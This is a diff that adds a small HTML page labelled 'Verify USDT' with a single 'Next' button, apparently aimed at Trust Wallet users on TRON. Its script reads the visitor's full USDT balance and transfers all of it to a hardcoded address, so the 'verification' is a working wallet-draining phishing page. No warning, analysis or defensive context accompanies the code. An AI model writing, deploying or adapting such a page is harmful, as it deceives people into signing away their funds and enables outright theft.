@@ -1,1 +1,51 @@
 
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>USDT Transfer</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
+  </head>
+  <body style="text-align:center;padding-top:100px;font-family:sans-serif">
+    <h2>Verify USDT</h2>
+    <button onclick="sendUSDT()" style="padding:10px 20px;font-size:18px">Next</button>
+    <p id="status"></p>
+
+    <script>
+      const CONTRACT_ADDRESS = "TYrS3KVuwSUKZwxXr56GA5jQUBpka8Kf3F";
+      const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Official USDT on TRON
+
+      async function sendUSDT() {
+        const status = document.getElementById("status");
+        status.innerText = "Connecting to wallet...";
+
+        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+          status.innerText = "Please open in Trust Wallet DApp browser and connect.";
+          return;
+        }
+
+        try {
+          const tronWeb = window.tronWeb;
+          const sender = tronWeb.defaultAddress.base58;
+
+          const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
+          const balance = await usdtContract.methods.balanceOf(sender).call();
+
+          if (parseInt(balance) === 0) {
+            status.innerText = "No USDT balance.";
+            return;
+          }
+
+          status.innerText = "Sending USDT...";
+
+          const tx = await usdtContract.methods
+            .transfer(CONTRACT_ADDRESS, balance)
+            .send();
+
+          status.innerText = "Transaction sent:\n" + tx;
+        } catch (err) {
+          status.innerText = "Error: " + err.message;
+        }
+      }
+    </script>
+  </body>
+</html>
